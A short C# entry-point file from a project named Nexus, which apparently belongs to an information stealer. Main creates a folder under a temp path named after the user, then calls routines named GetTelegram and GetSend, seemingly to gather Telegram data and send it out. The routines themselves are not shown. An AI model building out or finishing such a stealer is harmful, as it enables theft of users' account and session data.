using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Nexus
{
    class Program
    {
        static void Main(string[] args)
        {
            Directory.CreateDirectory(cConfig.temp + cConfig.username);
            core.cTelegram.GetTelegram();
            core.cSend.GetSend();
        }
    }
}
